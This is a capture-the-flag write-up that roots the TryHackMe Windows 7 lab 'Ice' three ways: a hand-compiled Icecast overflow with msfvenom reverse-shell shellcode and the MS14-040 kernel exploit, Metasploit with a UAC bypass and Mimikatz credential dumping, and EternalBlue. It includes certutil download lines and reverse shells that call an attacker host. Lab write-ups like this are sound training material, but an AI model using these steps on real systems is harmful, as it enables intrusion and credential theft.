Ice is an Easy Windows box from TryHackMe built around a single unpatched Windows 7 host, and it is one of the best boxes to keep as a reference because the *same* machine can be rooted three completely different ways. The foothold service is an ancient **Icecast** streaming server vulnerable to **CVE-2004-1561**, and the host is a fully unpatched Windows 7 SP1 with **SMBv1** exposed — which also makes it a textbook **MS17-010 (EternalBlue)** target.

This writeup deliberately documents all three routes **separately and in full detail**, so it doubles as a side-by-side of a manual workflow versus the framework:

- **Method 1 — Manual.** Generate shellcode with `msfvenom`, drop it into a C proof-of-concept, exploit the Icecast buffer overflow by hand for a shell as `Dark`, then escalate with the **MS14-040 (CVE-2014-1767)** kernel exploit to `SYSTEM`.
- **Method 2 — Metasploit (Icecast).** The same bug through `exploit/windows/http/icecast_header`, then a UAC bypass and a token/process migration to `SYSTEM`, finishing with a Mimikatz credential dump.
- **Method 3 — Metasploit (EternalBlue).** A single `MS17-010` shot straight to `SYSTEM`, no foothold needed.

Every Metasploit command below is explained line by line.

## Reconnaissance & Enumeration

### Port Scan

A full TCP scan with service and default-script detection. `-p-` scans all 65,535 ports, `-sCV` runs the default NSE scripts (`-sC`) plus version detection (`-sV`), and `-Pn` skips host discovery since ICMP already confirmed the host is up.

```bash
sudo nmap -p- -sCV -Pn -n 10.130.128.206 -oN nmap
```

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http          Icecast streaming media server
49152-49184/tcp open  msrpc   Microsoft Windows RPC
```

```bash
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: Dark-PC
|_  Workgroup: WORKGROUP
| smb-security-mode:
|_  message_signing: disabled (dangerous, but default)
```

Two facts on this output decide the whole box:

- Port **8000** runs **Icecast**, an open-source streaming media server. The Windows build is stuck at a version affected by **CVE-2004-1561** — a remote buffer overflow in its HTTP header handling. That is our foothold.
- The host is **Windows 7 Professional SP1 (build 7601)** with **445/SMB** open and **message signing disabled**. An unpatched Windows 7 with SMBv1 is the canonical **MS17-010 / EternalBlue** target, which we will confirm in Method 3.

### SMB Enumeration

Before touching the exploits, a quick SMB sweep. `crackmapexec` fingerprints the service in one line:

```bash
crackmapexec smb 10.130.128.206
```

```bash
SMB  10.130.128.206  445  DARK-PC  [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:DARK-PC) (domain:Dark-PC) (signing:False) (SMBv1:True)
```

That single line confirms the two things EternalBlue needs: **`signing:False`** and **`SMBv1:True`**. Listing shares anonymously and mapping permissions with an empty (null) session gives nothing usable, though:

```bash
smbclient -L 10.130.128.206 -N
# Anonymous login successful — but no shares are returned

smbmap -H 10.130.128.206 -u '' -p ''
# [!] Access denied on 10.130.128.206, no fun for you...
```

So SMB leaks only the hostname (**DARK-PC**) and the SMBv1 fact. There are no readable shares and no credentials to be found here — the way in is Icecast, and SMB becomes relevant again only as the direct EternalBlue path. With that, the recon splits into the three routes below.

## Method 1 — Manual Exploitation (Icecast + MS14-040)

The first route uses no exploitation framework at all: a public C proof-of-concept for **CVE-2004-1561**, fed with shellcode we generate ourselves.

The PoC used here is [Danyw24's CVE-2004-1561 repo](https://github.com/Danyw24/CVE-2004-1561-Icecast-Header-Overwrite-buffer-overflow-RCE-2.0.1-Win32-), which ships both a Python and a C version — we take the C one (`568-edit.c`, an edited copy of Exploit-DB 568). The exploit sends a malformed Icecast request that overflows a header buffer and redirects execution into a block of shellcode we embed in the source. So the first job is to produce that shellcode.

### Building the shellcode with msfvenom

```bash
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=443 -b '\x0a\x0d\x00' -f c
```

Every flag matters here:

- **`-a x86`** — target architecture. The Icecast process is 32-bit, so the shellcode must be x86.
- **`--platform Windows`** — the OS the payload runs on.
- **`-p windows/shell_reverse_tcp`** — the payload: a plain (non-staged) reverse shell that connects back to us. A plain `cmd.exe` shell is used rather than Meterpreter because we are catching it with a bare `netcat` listener, not a Metasploit handler.
- **`LHOST` / `LPORT`** — our IP and the port we will listen on (443).
- **`-b '\x0a\x0d\x00'`** — the **bad characters** to avoid. The shellcode travels inside an HTTP-style header string, and those bytes are line feed (`\n`), carriage return (`\r`) and the null byte — any of them would truncate or corrupt the request before it reaches the vulnerable buffer. `msfvenom` must encode the payload so none of these bytes appear in the output.
- **`-f c`** — output format: a C `unsigned char buf[]` array, ready to paste straight into the exploit source.

Because of the bad-char constraint, `msfvenom` automatically runs the payload through the **`x86/shikata_ga_nai`** polymorphic encoder, which rewrites it into an equivalent byte stream free of `\x0a`, `\x0d` and `\x00`:

```bash
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] =
"\xbf\xcd\x34\x8e\x1b\xd9\xc1\xd9\x74\x24\xf4\x5e\x33\xc9"
"\xb1\x52\x83\xee\xfc\x31\x7e\x0e\x03\xb3\x3a\x6c\xee\xb7"
... (trimmed) ...
"\x5c\xfc\xb7\x48\x59\xb8\x7f\xa1\x13\xd1\x15\xc5\x80\xd2\x3f";
```

### Patching and compiling the exploit

Paste that `buf[]` array over the placeholder shellcode inside `568-edit.c`, then compile it with `gcc`:

```bash
gcc 568-edit.c -o exploit
```

Running it points the exploit at the target's Icecast port and fires the malformed request. The PoC checks the response first, reports the service is vulnerable, then sends the overflow:

```bash
./exploit 10.130.128.206
```

```bash
Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
shellcode add-on by Delikon

- target 10.130.128.206:8000
- send malformed data

Server IS vulnerable!!!
```

```bash
sudo rlwrap nc -nlvp 443
```

### Local enumeration with winPEAS

The target has no outbound tooling, so we serve winPEAS from a Python web server on our box and pull it down with `certutil`, a signed Windows binary that doubles as a file downloader (`-urlcache -split -f` forces a fresh, complete download):

```bash
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/winPEAS.exe
winPEAS.exe
```

winPEAS turns up nothing decisive — no obvious service misconfig, no stored credentials, no weak file permissions. That is the cue to fall back to the platform itself: this is an old, unpatched Windows 7, so a **kernel exploit** is the reliable path.

### Privilege Escalation — MS14-040 (CVE-2014-1767) → SYSTEM

**MS14-040** is a double-free vulnerability in `afd.sys` (the Ancillary Function Driver for Winsock). On an unpatched Windows 7 SP1 it lets a local low-privileged user corrupt kernel memory and execute code as `NT AUTHORITY\SYSTEM`. The patch that fixes it is **KB2961072**, so the quickest way to confirm the box is vulnerable is to list the installed hotfixes and check whether that KB (or any post-July-2014 rollup) is present:

```bash
wmic qfe get HotFixID | findstr "KB2961072"
# (no output — patch not installed)

wmic qfe get HotFixID
```

```bash
HotFixID
KB2534111
KB976902
```

Only two ancient hotfixes are installed and **KB2961072 is absent**, so `afd.sys` is unpatched and the double-free is exploitable. A precompiled exploit is available from SecWiki's [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-040) collection; download it with `certutil` and run it:

```bash
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/MS14-040-x64.exe
MS14-040-x64.exe
```

```bash
c:\Windows\System32> whoami
nt authority\system
```

That is full `SYSTEM` on the box, reached entirely by hand. Route one complete.

## Method 2 — Metasploit (Icecast + UAC Bypass)

The second route exploits the **same Icecast bug**, but through Metasploit — and then takes a completely different escalation path (a UAC bypass plus a process migration) to show how the framework chains post-exploitation together.

### Launching the framework and a workspace

```bash
msfconsole
```

```bash
msf > workspace --add Ice
[*] Added workspace: Ice
```

**`workspace --add Ice`** creates and switches to a named workspace. Workspaces are Metasploit's way of keeping the hosts, services and loot of one engagement isolated in its backing database, so notes from this box never mix with another.

### Foothold: exploit/windows/http/icecast_header

```bash
msf > search icecast
```

```bash
#  Name                                 Disclosure Date  Rank   Check  Description
-  ----                                 ---------------  ----   -----  -----------
0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
```

- **`search icecast`** queries the module database for anything matching the service name. One module comes back — the very CVE-2004-1561 header overwrite we exploited by hand.

```bash
msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

- **`use 0`** selects that module by its search index (equivalent to `use exploit/windows/http/icecast_header`). Metasploit auto-selects a sensible default payload, `windows/meterpreter/reverse_tcp` — a staged Meterpreter shell, which is why this route does not need `msfvenom`.

```bash
msf exploit(windows/http/icecast_header) > show options
```

- **`show options`** lists every setting the module and its payload require. Here `RHOSTS` (the target) and `RPORT 8000` are already correct for the module; we only need to set our own listener details.

```bash
msf exploit(...) > set RHOSTS 10.130.128.206
msf exploit(...) > set LHOST <ATTACKER_IP>
msf exploit(...) > exploit
```

- **`set RHOSTS` / `set LHOST`** — the target IP and *our* IP (where Meterpreter connects back).
- **`exploit`** — sends the malicious Icecast headers and starts the reverse-TCP handler in one step.

```bash
[*] Started reverse TCP handler on <ATTACKER_IP>:4444
[*] Sending stage (196678 bytes) to 10.130.128.206
[*] Meterpreter session 2 opened (<ATTACKER_IP>:4444 -> 10.130.128.206:49269)

meterpreter > getuid
Server username: Dark-PC\Dark
```

Some quick post-exploitation orientation:

```bash
meterpreter > sysinfo        # OS, build, architecture, domain
meterpreter > getuid         # who we are: Dark-PC\Dark
meterpreter > getprivs       # our token's privileges (limited — same as Method 1)
```

- **`sysinfo`** prints the OS/build/architecture — Windows 7 x64, Meterpreter x86.
- **`getuid`** confirms we are the unprivileged `Dark-PC\Dark` again.
- **`getprivs`** lists the token privileges; as in Method 1 it is the bare unprivileged set, so we need to escalate.

### Finding a local escalation with the suggester

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
```

```bash
[*] 10.130.128.206 - Collecting local exploits for x86/windows...
    exploit/windows/local/bypassuac_eventvwr
```

- **`run post/multi/recon/local_exploit_suggester`** runs a post module that checks the session against Metasploit's local exploits and reports which are likely to work. It flags **`bypassuac_eventvwr`** — a UAC bypass. That matters because `Dark` is a member of the local Administrators group, but under **User Account Control** the token is filtered down to a standard-user token; a UAC bypass gives us back the *full* administrator token without a password prompt.

```bash
meterpreter > background
```

- **`background`** detaches the current Meterpreter session (keeping it alive as session 2) and drops back to the `msf >` prompt, so we can load another module against it.

### UAC bypass: exploit/windows/local/bypassuac_eventvwr

```bash
msf > use exploit/windows/local/bypassuac_eventvwr
msf exploit(...) > set session 2
msf exploit(...) > exploit
```

- **`use exploit/windows/local/bypassuac_eventvwr`** selects the UAC-bypass module. It abuses `eventvwr.exe`, a Microsoft-signed binary that auto-elevates: it reads a command from the `HKCU\Software\Classes\mscfile\shell\open\command` registry key, which a normal user can write. The module plants our payload there, launches `eventvwr.exe`, and Windows runs the payload at **high integrity** without prompting.
- **`set session 2`** tells the module which existing Meterpreter session to escalate through.
- **`exploit`** performs the bypass and opens a new, elevated session:

```bash
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[*] Meterpreter session 3 opened (<ATTACKER_IP>:4444 -> 10.130.128.206:49316)

meterpreter > getuid
Server username: Dark-PC\Dark
```

`getuid` still says `Dark-PC\Dark` — but the difference is the **token**. `getprivs` now returns the *full* administrator privilege set that was filtered out before:

```bash
meterpreter > getprivs
```

```bash
SeBackupPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeLoadDriverPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege   # the important one
... (full admin set) ...
```

With **`SeDebugPrivilege`** in hand, we can open and inject into any process on the system — including one already running as `SYSTEM`.

### Migrating into a SYSTEM process

```bash
meterpreter > ps
```

```bash
 PID   PPID  Name          Arch  Session  User
 ---   ----  ----          ----  -------  ----
 1376  692   spoolsv.exe   x64   0        NT AUTHORITY\SYSTEM   # the target
 1320  1296  explorer.exe  x64   1        Dark-PC\Dark
```

- **`ps`** lists running processes with their owners. `spoolsv.exe` (the print spooler, PID 1376) runs as `NT AUTHORITY\SYSTEM` — a perfect migration target.

```bash
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 3124 to 1376...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

- **`migrate -N spoolsv.exe`** injects our Meterpreter into the process *by name* (`-N`) and moves execution there. Because `SeDebugPrivilege` lets us open the SYSTEM-owned process, Meterpreter inherits its token — and `getuid` now returns **`NT AUTHORITY\SYSTEM`**. Migrating also makes the session more stable, since it no longer depends on the Icecast process staying alive.

### Dumping credentials with Kiwi (Mimikatz)

Now as SYSTEM, we can read secrets straight out of memory:

```bash
meterpreter > load kiwi
meterpreter > creds_all
```

- **`load kiwi`** loads the Kiwi extension — the Meterpreter build of **Mimikatz**.
- **`creds_all`** parses every credential provider in LSASS memory (msv, wdigest, tspkg, kerberos) and prints what it finds:

```bash
msv:
Username  Domain   NTLM
--------  ------   ----
Dark      Dark-PC  7c4fe5eada682714a036e39378362bab

wdigest / tspkg / kerberos:
Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!
```

On Windows 7, WDigest stores the password in cleartext in memory, so Kiwi recovers **`Dark : Password01!`** outright, alongside the NTLM hash. Finally, `hashdump` reads the local SAM database for every account's NTLM hash:

```bash
meterpreter > hashdump
```

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Dark:1000:aad3b435b51404eeaad3b435b51404ee:7c4fe5eada682714a036e39378362bab:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Those hashes could be cracked offline or reused directly in a **pass-the-hash** attack. Route two complete.

## Method 3 — Metasploit (EternalBlue / MS17-010)

The third route ignores Icecast entirely. Because the host is an unpatched Windows 7 SP1 with SMBv1, it is vulnerable to **MS17-010 (EternalBlue)** — a pool-corruption bug in the SMBv1 driver (`srv.sys`) that yields code execution as `SYSTEM` directly, with no user shell in between. This is the shortest path on the whole box.

### Confirming SMB and the vulnerability

```bash
msf > search type:auxiliary smb
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > setg RHOSTS 10.130.128.206
msf auxiliary(scanner/smb/smb_version) > run
```

- **`search type:auxiliary smb`** filters the module search to *auxiliary* modules (scanners, not exploits) related to SMB.
- **`use auxiliary/scanner/smb/smb_version`** selects the SMB version-detection scanner.
- **`setg RHOSTS 10.130.128.206`** sets the target **globally** (`setg` instead of `set`), so every module we load afterwards inherits it and we do not have to re-type it.
- **`run`** executes the scanner:

```bash
[*] 10.130.128.206:445 - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional)
[+] 10.130.128.206:445 -   Host is running Windows 7 Professional SP1 (build:7601)
```

SMBv1 is present — the precondition for EternalBlue. Now the dedicated MS17-010 check:

```bash
msf auxiliary(scanner/smb/smb_version) > search ms17_010
msf auxiliary(...) > use auxiliary/scanner/smb/smb_ms17_010
msf auxiliary(scanner/smb/smb_ms17_010) > run
```

```bash
[+] 10.130.128.206:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
```

- **`search ms17_010`** lists the EternalBlue-family modules (the scanner, the exploit, and the EternalRomance psexec variant).
- **`use auxiliary/scanner/smb/smb_ms17_010`** loads the check module, which safely probes the SMB flaw without exploiting it.
- **`run`** confirms the host is **likely VULNERABLE**.

### Exploit: exploit/windows/smb/ms17_010_eternalblue

```bash
msf auxiliary(...) > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > setg LHOST <ATTACKER_IP>
msf exploit(...) > exploit
```

- **`use exploit/windows/smb/ms17_010_eternalblue`** selects the exploit; Metasploit defaults to a **x64** Meterpreter payload because the target is 64-bit. `RHOSTS` is already set globally from the scan.
- **`setg LHOST <ATTACKER_IP>`** sets our listener address globally.
- The module keeps `VERIFY_ARCH` and `VERIFY_TARGET` enabled, so before firing it re-checks that the remote architecture and OS match the chosen target — a guard against the blue-screen risk EternalBlue carries if aimed at the wrong build.
- **`exploit`** launches the attack.

EternalBlue is a heap-grooming exploit, so it is not always first-time reliable. The console shows the first attempt fail, then Metasploit automatically retries with more "groom allocations" and wins on the second pass:

```bash
[*] 10.130.128.206:445 - Trying exploit with 12 Groom Allocations.
[+] 10.130.128.206:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[-] 10.130.128.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.130.128.206:445 - Trying exploit with 17 Groom Allocations.
[+] 10.130.128.206:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (244806 bytes) to 10.130.128.206
[*] Meterpreter session 1 opened (<ATTACKER_IP>:4444 -> 10.130.128.206:49243)
[+] 10.130.128.206:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

The payload lands directly in the kernel/SMB context, so there is no low-privileged hop at all:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

`SYSTEM` from a single command. Route three complete.

## Key Takeaways

- **One host, three roads to SYSTEM.** Ice is the clearest illustration that a machine is only as secure as its weakest exposure: an ancient service (Icecast), a missing kernel patch (MS14-040) and an unpatched SMBv1 stack (MS17-010) are each independently game-over. Patch management is not optional on any one of them.
- **Manual and framework exploitation are the same idea at different altitudes.** Method 1 and Method 2 exploit the *identical* CVE-2004-1561 bug — one by generating shellcode with `msfvenom` and hand-compiling a PoC, the other with a single `exploit` command. Doing it manually once is what makes the framework legible: you know what the module is actually sending.
- **Bad characters drive shellcode encoding.** The `-b '\x0a\x0d\x00'` constraint is the reason `msfvenom` reached for `shikata_ga_nai`. When a payload is delivered inside a text protocol, null bytes and CR/LF will break the buffer, and the encoder exists precisely to remove them.
- **UAC is not a privilege boundary.** `Dark` was already an administrator; UAC only *filtered* the token. `bypassuac_eventvwr` restored the full admin token with no prompt, after which `SeDebugPrivilege` + a migration into a SYSTEM process was all it took to become SYSTEM.
- **On old Windows, cleartext creds are in memory.** WDigest on Windows 7 kept `Dark`'s password recoverable in plaintext through Mimikatz, and the SAM handed over every NTLM hash for reuse. Reaching SYSTEM is rarely the end — it is the start of credential harvesting and lateral movement.
